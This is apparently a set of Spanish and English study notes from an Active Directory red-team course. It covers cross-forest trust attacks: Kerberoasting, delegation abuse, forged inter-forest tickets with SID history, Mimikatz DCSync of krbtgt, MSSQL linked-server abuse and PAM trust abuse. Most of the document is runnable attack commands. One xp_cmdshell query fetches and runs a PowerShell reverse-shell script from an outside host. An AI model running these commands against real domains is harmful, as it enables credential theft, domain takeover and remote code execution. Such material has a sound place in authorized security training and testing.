# Cross Forest Attacks

- Ahora tenemos privilegios de administrador empresarial en el bosque
- Analicemos algunas técnicas para moverse a través de los forest trusts

**Cross Forest Attacks - Kerberoast**

- Es posible ejecutar Kerberoast en confianzas forestales.
- Vamos a enumerar las cuentas de servicio con nombre en las confianzas forestales
- Usando PowerView:

    `Get-DomainTrust | ?{$_.TrustAttributes -eq
    'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain
    $_.TargetName}`

- ActiveDirectory Module:

    `Get-ADTrust -Filter 'IntraForest -ne $true' | %{GetADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}`

- Request a TGS:

    `C:\AD\Tools\Rubeus.exe kerberoast /user: /simple /domain: /outfile:euhashes.txt`

- Check for the TGS:

    `klist`

- Crack using John:

    `john.exe --wordlist=C:\pass.txt C:\hashes.txt`

- Request TGS across trust using PowerShell:

    `Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local`

**Privilege Escalation – Constrained Delegation with Protocol Transition**

- La delegación restringida clásica no funciona en confianzas forestales.
- Pero podemos abusar de él una vez que tengamos un punto de apoyo a través de la confianza forestal.

Using PowerView:

`Get-DomainUser –TrustedToAuth -Domain `

`Get-DomainComputer –TrustedToAuth -Domain `

Using ActiveDirectory module:

`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server `

Podemos solicitar un billete alternativo utilizando Rubeus:

`C:\Rubeus.exe hash /password:August@2019
/user: /domain:`

`C:\Rubeus.exe s4u /user:
/rc4:
/impersonateuser:Administrator /domain:
/msdsspn:nmagent/ /altservice:ldap /dc: /ptt`

Abuse the TGS to LDAP:

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:"'`

Or:

`C:\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain  --DomainController `

**Cross Forest Attacks - Unconstrained Delegation**

- Recuerde el error de la impresora y su abuso de una máquina con delegación sin restricciones.
- Lo hemos utilizado para escalar privilegios a Administrador de dominio y Administrador de empresa.
- ¡También funciona en una confianza de bosque bidireccional con la delegación TGT habilitada!
- La delegación TGT está deshabilitada de forma predeterminada y debe habilitarse explícitamente a través de una confianza para el bosque de confianza (destino).
- En el laboratorio, TGTDelegation se establece
(pero no configurado para la otra dirección).

Para enumerar si TGTDelegation está habilitado en una confianza de bosque, ejecute el siguiente comando desde un DC:

`netdom trust trustingforest /domain:trustedforest
/EnableTgtDelegation`

`netdom trust .local /domain:.local
/EnableTgtDelegation`

Los cmdlets de PowerShell de ADModule parecen tener un error, el siguiente comando muestra TGTDelegation establecido en False:

`Get-ADTrust -server .local -Filter *`

Pero cuando se ejecuta desde -dc, muestra que TGTDelegation es True.

**Cross Forest Attacks - Trust Key**

- Al abusar del flujo de confianza entre los bosques en una confianza bidireccional, es posible acceder a los recursos a través de los límites del bosque.
- Podemos usar la clave de confianza, de la misma manera que en los Domain Trusts , pero podemos acceder solo a los recursos que se comparten explícitamente con nuestro bosque actual.
- Tenga en cuenta que estamos saltando confianzas 
- Al igual que en el escenario dentro de un bosque, necesitamos la clave de confianza para la confianza entre bosques.

    `Invoke-Mimikatz -Command '"lsadump::trust /patch"'`

    Or:

    `Invoke-Mimikatz -Command '"lsadump::dcsync
    /user:eu\user"'`

- Se puede forjar un TGT entre bosques:

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /user:Administrator /domain:.local /sid:
    /rc4: /service:krbtgt /target:.local /sids:
    /ticket:C:\sharedwitheu.kirbi"'`

- Obtenga un TGS para un servicio (CIFS a continuación) en el bosque de destino mediante el vale de confianza falsificado.

    `.\asktgs.exe C:\sharedwitheu.kirbi CIFS/`

- También se pueden crear tickets para otros servicios (como HOST y RPCSS para WMI, HOST y HTTP para PowerShell Remoting y WinRM):
- Utilice el TGS para acceder al recurso de destino que debe compartirse explícitamente:

    `.\kirbikator.exe lsa CIFS.local.kirbi`

    `ls \\.local\user\`

- Con Rubeus:

    `C:\Rubeus.exe asktgs
    /ticket:C:\sharedwitheu.kirbi
    /service:CIFS/.local /dc:.local /ptt`

- Esto está bien, pero ¿por qué no podemos acceder a todos los recursos como Intra Forest?
- El filtrado SID es la respuesta. Filtra los SID de alto privilegio del SIDHistory de un TGT que cruza el límite del bosque. Esto significa que no podemos simplemente seguir adelante y acceder a los recursos en el bosque de confianza como administradores de empresa.
- Pero hay una trampa:

    ![Cross%20Forest%20Attacks%2076dc085b3f9b46cdb291455124819d5c/Untitled.png](images/Cross%20Forest%20Attacks/Untitled.png)

    Esto significa que, si tenemos una confianza externa (o una confianza de bosque con el historial de SID habilitado,/ enabledidhistory: sí), podemos inyectar un SIDHistory para RID> 1000 para acceder a los recursos accesibles a esa identidad o grupo en el bosque de confianza de destino.

- Tuvimos acceso DA a eu.local. Enumeremos los fideicomisos de una sesión de PSRemting en eu-dc:

    `Get-ADTrust -Filter *`

- SIDFilteringForestAware se establece en True, lo que significa que SIDHistory está habilitado en la confianza del bosque.
- Recuerde que todavía solo se permitirán RID> 1000 SID a través del límite de confianza.

    `Get-ADGroup -Identity EUAdmins -Server .local`

- Desde eu-dc, cree un TGT con SIDHistory del grupo EUAdmins:

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /user:Administrator /domain:.local /sid:
    /rc4: /service:krbtgt/target:.local /sids:
    /ticket:C:\euvendornet.kirbi"'`

Request a TGS:

`.\asktgs.exe C:\euvendornet.kirbi HTTP/.local`

Inject that into current session:

`.\kirbikator.exe lsa .local.kirbi`

Acceda a la máquina euvendor-net usando PSRemoting:

`Invoke-Command -ScriptBlock{whoami} -ComputerName .local -Authentication NegotiateWithImplicitCredential`

**Trust Abuse - MSSQL Servers**

- Los servidores MS SQL generalmente se implementan en abundancia en un dominio de Windows.
- Los servidores SQL brindan muy buenas opciones para el movimiento lateral, ya que permiten mapear usuarios de dominio a roles de base de datos y así convertirse en parte de
AD trusts.
- Veamos un escenario en el que podemos abusar de la confianza de los servidores SQL y de los enlaces de bases de datos para traspasar los límites de la confianza del bosque.
- Para piratería informática de MSSQL y PowerShell, usemos PowerUpSQL

    [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

Discovery (SPN Scanning):

`Get-SQLInstanceDomain`

Check Accessibility

`Get-SQLConnectionTestThreaded`

`Get-SQLInstanceDomain | Get SQLConnectionTestThreaded -
Verbose`

Recopilar información

`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`

**Trust Abuse - MSSQL Servers - Database Links**

- Un enlace de base de datos permite que un servidor SQL acceda a fuentes de datos externas como otros servidores SQL y fuentes de datos OLE DB.
- En el caso de enlaces de bases de datos entre servidores SQL, es decir, servidores SQL enlazados, es posible ejecutar procedimientos almacenados.
- Los enlaces de bases de datos funcionan incluso en trusts forestales.

Searching Database Links

Look for links to remote servers

`Get-SQLServerLink -Instance .local -Verbose`

We can manually enumerate linked servers

`select * from master..sysservers`

La función Openquery se puede utilizar para ejecutar consultas en una base de datos vinculada

`select * from openquery("IP",'select * from master..sysservers')`

Las consultas de Openquery se pueden encadenar para acceder a enlaces dentro de enlaces (enlaces anidados)

`select * from openquery("IP ",'select * from openquery("db-",''select @@version as version'')')`

Executing Commands

En el servidor de destino, xp_cmdshell ya debería estar habilitado, Si rpcout está habilitado (deshabilitado de forma predeterminada), xp_cmdshell se puede habilitar usando:

`EXECUTE('sp_configure''xp_cmdshell'',1;reconfigure;') AT "db-"`

Desde el servidor SQL inicial, los comandos del sistema operativo se pueden ejecutar mediante consultas de enlace anidadas:

`select * from openquery("IP",'select * from openquery("db-",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://IP/Invoke-PowerShellTcp.ps1'''')"'')')`

Abusing Database Links

Rastrear enlaces a servidores remotos

`Get-SQLServerLinkCrawl -Instance .local`

Abusar de enlaces a servidores remotos (intenta usar xp_cmdshell en cada eslabón de la cadena):

`Get-SQLServerLinkCrawl -Instance .local -Query 'exec master..xp_cmdshell ''whoami'''`

**Cross Forest Attacks - Foreign Security Principals**

- Una entidad de seguridad externa (FSP) representa una entidad de seguridad en un trust de bosque externo o identidades especiales (como usuarios autenticados, CD de empresas, etc.).
- Solo el SID de un FSP se almacena en el contenedor principal de seguridad externa que se puede resolver mediante la relación de confianza.
- FSP permite que los principales externos se agreguen a los grupos de seguridad locales del dominio. Por lo tanto, permitir que dichos directores accedan a los recursos del bosque.
- A menudo, los proveedores de servicios financieros se ignoran, están mal configurados o son demasiado complejos para cambiarlos o limpiarlos en una empresa, lo que los hace propicios para el abuso.
- Enumeremos los FSP para el dominio .local usando el shell inverso que tenemos allí.
• PowerView:
`Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose`
• Utilizando el módulo ActiveDirectory:
`Get-ADObject -Filter {objectClass -eq "ForeignSecurityPrincipal"}`

**Cross Forest Attacks - ACLs**

- El acceso a los recursos en un trust forestal también se puede proporcionar sin utilizar FSP que utilicen ACL.
- Los principales agregados a las ACL NO aparecen en el contenedor ForeignSecurityPrinicpals, ya que el contenedor se llena solo cuando se agrega un principal a un grupo de seguridad local de dominio.
- Enumeremos las ACL para el dominio dbvendor.local usando el shell inverso que tenemos en db.local:
`Find-InterestingDomainAcl -Domain .local`

**Cross Forest Attacks - Abusing PAM Trust**

- La confianza de PAM generalmente está habilitada entre un bosque Rojo y un bosque de producción / usuario que administra.
- La confianza de PAM proporciona la capacidad de acceder al bosque de producción con privilegios elevados sin utilizar las credenciales del bosque. Por lo tanto, mayor seguridad para el bosque que tanto se desea.
- Para lograr lo anterior, los directores de sombra se crean en el dominio que luego se asignan a los SID de los grupos DA o EA en el bosque de producción.
- Tenemos acceso DA al bosque .local Al enumerar trusts y buscar acceso, podemos enumerar que tenemos acceso administrativo al bosque .local.
- Desde techcorp-dc:

    `Get-ADTrust -Filter *`

    `Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server .local`

- En -dc, enumeramos si hay algun PAM Trust:

    `$dc = New-PSSession -dc.local Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $dc`

- Checkeamos los usuario miembro del Shadow Principal:

    `Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," +(GetADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc`

- Establecemos un PSRemoting directo con la sesion en -dc y accedemos a .local:

    `Enter-PSSession IP -Authentication NegotiateWithImplicitCredential`
